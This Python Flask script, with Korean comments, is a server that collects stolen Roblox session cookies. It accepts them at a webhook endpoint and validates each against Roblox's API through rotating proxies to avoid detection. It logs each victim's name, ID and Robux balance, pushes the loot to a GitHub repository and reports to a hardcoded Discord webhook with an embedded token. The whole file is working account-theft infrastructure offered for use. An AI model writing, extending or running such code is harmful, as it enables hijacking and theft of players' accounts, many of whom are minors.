import requests, json, time, os, subprocess
from datetime import datetime
from random import choice, randint
from threading import Thread, Lock
from flask import Flask, request

# ===== 설정 (여기만 수정하면 됨) =====
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1519016223558340763/VGMWxHAntSmh5o18yRoziahcucUREBqfTEbX2IItByAjpPPAQeHTqtDyQnAzY8mmPX4w"
GITHUB_REPO_PATH = "/path/to/your/repo"  # 로컬 GitHub 저장소 경로
PROXY_POOL = [
    "http://user:pass@ip:port",  # 실제 프록시로 교체
    # 더 추가
]
# ====================================

file_lock = Lock()

def discord(title, desc, color=0x00ff00, fields=None):
    payload = {"embeds": [{"title": title, "description": desc, "color": color, "fields": fields or []}]}
    requests.post(DISCORD_WEBHOOK, json=payload)

def validate(cookie, proxy):
    try:
        r = requests.get("https://www.roblox.com/mobileapi/userinfo",
                         headers={"Cookie": f".ROBLOSECURITY={cookie}"},
                         proxies={"http": proxy, "https": proxy}, timeout=15)
        if r.status_code == 200:
            d = r.json()
            return d.get("UserID"), d.get("UserName"), d.get("RobuxBalance", 0)
    except: pass
    return None, None, None

def process(cookie, source="unknown"):
    discord("🔄 수신됨", f"출처: {source}\n쿠키: {cookie[:40]}...", 0xffff00)
    for i in range(5):
        proxy = choice(PROXY_POOL)
        uid, name, robux = validate(cookie, proxy)
        if uid:
            with file_lock:
                with open(os.path.join(GITHUB_REPO_PATH, "cookies.txt"), 'a') as f:
                    f.write(f"[{datetime.now()}] {name}({uid}) | {robux}R$ | {cookie[:60]}...\n")
            os.chdir(GITHUB_REPO_PATH)
            subprocess.run(["git", "add", "cookies.txt"], capture_output=True)
            subprocess.run(["git", "commit", "-m", f"Cookie: {name}"], capture_output=True)
            subprocess.run(["git", "push"], capture_output=True)
            discord("✅ 성공", f"{name} | {robux}R$ | 프록시: {proxy[:30]}...", 0x00ff00)
            return
        time.sleep(randint(1, 3))
    discord("❌ 실패", f"5개 프록시 모두 실패", 0xff0000)

app = Flask(__name__)
@app.route('/webhook', methods=['POST'])
def hook():
    data = request.get_json()
    if data and data.get('cookie'):
        Thread(target=process, args=(data['cookie'], data.get('source', 'web'))).start()
    return {"status": "ok"}

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
